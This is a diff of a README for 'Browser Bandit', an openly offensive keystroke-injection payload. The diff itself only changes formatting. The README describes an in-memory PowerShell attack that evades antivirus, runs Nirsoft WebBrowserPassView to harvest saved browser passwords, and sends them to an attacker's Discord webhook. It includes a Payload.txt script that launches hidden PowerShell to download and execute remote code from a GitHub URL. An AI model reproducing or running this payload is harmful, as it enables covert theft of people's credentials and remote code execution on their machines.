@@ -8,9 +8,6 @@
 
 Browser Bandit can be deployed alongside the Code-382 SignalStrike. This combination leverages a PowerShell payload that executes directly in the system’s memory, bypassing antivirus detection and eliminating the need to write files locally. The PowerShell script then downloads Nirsoft’s WebBrowserPassView application, runs it, and collects any discovered passwords. The resulting password data is saved in a `.txt` file, which is then transmitted to the attacker’s Discord Webhook.
 
-```
-test
-```
 
 ## 1. Create a Discord Webhook
 
@@ -29,7 +26,7 @@ In the `Payload.txt` file, locate line 12 and replace `<DISCORD WEBHOOK HERE>` w
 
 ### `Payload.txt`
 
-```bash
+```
 DELAY 100
 GUI d
 GUI r
@@ -46,7 +43,7 @@ ENTER
 SPACE
 STRING Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `$webhook='$webhook'; iex (iwr 'https://raw.githubusercontent.com/Code-382/Payload-Depot/main/SignalStrike/Browser%20Bandit/BrowserBandit.txt').Content" -NoNewWindow
 ENTER
-
+```
 
 
 
